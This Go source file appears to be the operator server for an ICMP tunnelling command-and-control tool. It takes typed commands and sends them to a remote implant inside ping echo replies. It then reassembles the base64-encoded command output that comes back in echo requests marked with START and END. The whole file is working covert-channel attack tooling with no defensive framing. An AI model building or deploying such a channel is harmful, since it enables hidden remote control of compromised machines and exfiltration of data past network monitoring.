package main

import (
	"bytes"
    b64 "encoding/base64"
    "encoding/json"
	"fmt"
    "strings"
    "github.com/chzyer/readline"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

const (
    ProtocolICMP = 1
    TTL = 128
    ChunkSize = 64
    ListenAddr = "0.0.0.0"
)

type Cmd struct {
    Cmd     string  `json:"cmd"`
    Output  string  `json:"output"`
}

func makeJson(cmd string, output string) string {
    b64_cmd := b64.StdEncoding.EncodeToString([]byte(cmd))
    b64_output := b64.StdEncoding.EncodeToString([]byte(output))
    data, _ := json.Marshal(Cmd{Cmd: b64_cmd, Output: b64_output})
    return string(data) + "\n"
}

func encodeB64(text string) string {
    b64_cmd := b64.StdEncoding.EncodeToString([]byte(text))
    data, _ := json.Marshal(Cmd{Cmd: b64_cmd})
    return string(data)
}

func trimStr(str string) string {
    result := strings.Replace(str, "AAA", "", -1)
    result = strings.Replace(result, "CCC", "", -1)
    return result
}

func parseBody(p int, b icmp.MessageBody) string {
    mb, _ := b.Marshal(p)
    result := mb[4:]
    return string(result)
}

func decodeB64(result string, dat Cmd) (string, string) {
    if err := json.Unmarshal([]byte(result), &dat); err != nil {
        fmt.Println("server: reader json error: " + err.Error())
    }
    sDec, err := b64.StdEncoding.DecodeString(dat.Output)
    if err != nil {
        fmt.Println("server: reader base64 error: " + err.Error())
    }
    sCmd, err := b64.StdEncoding.DecodeString(dat.Cmd)
    if err != nil {
        fmt.Println("server: reader base64 error: " + err.Error())
    }
    return string(sCmd), string(sDec)
}

//ref: https://play.golang.org/p/b5f1aRBBUn
func buildICMP(t icmp.Type, id int, seq int, size int,data string) ([]byte, error) {
	var buf bytes.Buffer

	template := []byte(data)
    buf.Write(template)

	msg := icmp.Message{
		Type: t,
		Code: 0,
		Body: &icmp.Echo{
			ID:   id,
			Seq:  seq,
			Data: buf.Bytes(),
		},
	}

	return msg.Marshal(nil)
}

func main() {
    i := 1
    resp := "abcdefghijklmnopqrstuvwabcdefghi"
    for i != 0 {
        rl, err := readline.New("> ")
        if err != nil {
            fmt.Println(err)
        }
        defer rl.Close()
        var cmd, text string
        for {
            cmd, err = rl.Readline()
            if err != nil { // io.EOF
                break
            }
            text = "AAA" + cmd + "CCC"
            break
        }
        fmt.Println(cmd)
        c, _ := icmp.ListenPacket("ip4:icmp", ListenAddr)
        p := c.IPv4PacketConn()
        defer c.Close()

        reply := make([]byte, 1500)
        n, _, peer, _ := p.ReadFrom(reply)
        rm, _ := icmp.ParseMessage(ProtocolICMP, reply[:n])
        p.SetTTL(TTL)

        switch rm.Type {
            case ipv4.ICMPTypeEcho:
                echoReply, _ := buildICMP(ipv4.ICMPTypeEchoReply, rm.Body.(*icmp.Echo).ID, rm.Body.(*icmp.Echo).Seq, len(text), text)
                p.WriteTo(echoReply,nil, peer)
        }
        j := 1

        var start int
        var raw string
        for j != 0 {
            c, _ := icmp.ListenPacket("ip4:icmp", ListenAddr)
            p := c.IPv4PacketConn()
            defer c.Close()

            reply := make([]byte, 1500)
            n, peer, _ := c.ReadFrom(reply)
            rm, _ := icmp.ParseMessage(ProtocolICMP, reply[:n])
            result := parseBody(rm.Type.Protocol(), rm.Body)
            p.SetTTL(TTL)

            switch rm.Type {
                case ipv4.ICMPTypeEcho:
                    if strings.Index(string(result), "END") > 1  {
                        var datTmp Cmd
                        if len(raw) > 0 {
                            sCmd, sDec := decodeB64(raw,datTmp)
                            fmt.Println("cmd: \n" + sCmd)
                            fmt.Println("output: \n" + sDec)
                        }
                        j = 0
                    } else if strings.Index(string(reply), "START") > 1  {
                        start = 1
                    } else if start == 1 {
                        result = trimStr(result)
                        raw = raw + result
                    } else {
                        result = trimStr(result)
                        raw = result
                    }
                    echoReply, _ := buildICMP(ipv4.ICMPTypeEchoReply, rm.Body.(*icmp.Echo).ID, rm.Body.(*icmp.Echo).Seq, len(resp), resp)
                    p.WriteTo(echoReply,nil,peer)
                default:
                    fmt.Println(".")
            }
        }
    }
}
